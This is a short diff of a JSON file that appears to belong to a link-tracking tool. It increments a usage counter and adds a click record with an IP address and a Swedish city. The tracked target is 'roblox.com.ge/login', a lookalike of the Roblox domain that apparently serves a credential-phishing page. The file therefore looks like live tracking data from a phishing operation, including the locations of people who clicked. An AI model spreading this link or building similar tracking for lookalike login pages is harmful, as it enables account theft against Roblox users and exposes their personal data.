@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1016,
+    "useCount": 1017,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8248,6 +8248,14 @@
         "city": "Bonn",
         "flag": "🇩🇪",
         "countryCode": "DE"
+      },
+      {
+        "timestamp": 1777225695860,
+        "ip": "185.205.224.90",
+        "country": "Sweden",
+        "city": "Kävlinge",
+        "flag": "🇸🇪",
+        "countryCode": "SE"
       }
     ]
   },
